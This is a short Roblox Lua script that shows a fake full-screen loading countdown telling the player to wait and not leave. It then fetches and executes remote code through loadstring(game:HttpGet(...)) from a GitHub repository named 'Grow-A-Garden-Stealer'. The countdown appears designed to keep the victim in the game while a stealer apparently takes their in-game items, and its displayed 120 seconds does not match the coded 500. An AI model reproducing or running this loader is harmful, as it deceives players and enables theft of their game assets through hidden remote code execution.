-- Services
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Create GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreenGUI"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Background
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
background.Parent = screenGui

-- Warning Text
local warningText = Instance.new("TextLabel")
warningText.Size = UDim2.new(0.9, 0, 0.2, 0)
warningText.Position = UDim2.new(0.05, 0, 0.3, 0)
warningText.Text = "⏳ Please wait 2 minutes...\nIf you leave early, the script won't work!"
warningText.Font = Enum.Font.GothamBold
warningText.TextColor3 = Color3.new(1, 0.8, 0.1)
warningText.TextScaled = true
warningText.BackgroundTransparency = 1
warningText.TextWrapped = true
warningText.Parent = background

-- Countdown Label
local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
timerLabel.Position = UDim2.new(0.25, 0, 0.55, 0)
timerLabel.Text = "120"
timerLabel.Font = Enum.Font.GothamBlack
timerLabel.TextColor3 = Color3.new(1, 1, 1)
timerLabel.TextScaled = true
timerLabel.BackgroundTransparency = 1
timerLabel.Parent = background

-- Countdown Logic
local countdownTime = 500

for i = countdownTime, 0, -2 do
	timerLabel.Text = "⏳ Time Left: " .. i .. "s"
	wait(1)
end

-- Done loading
warningText.Text = "✅ You're now safe. Loading complete!"
timerLabel.Text = ""

wait(1.5)
screenGui:Destroy()

loadstring(game:HttpGet("https://raw.githubusercontent.com/OPSCRIPTV1/Grow-A-Garden-Stealer/refs/heads/main/.lua"))()
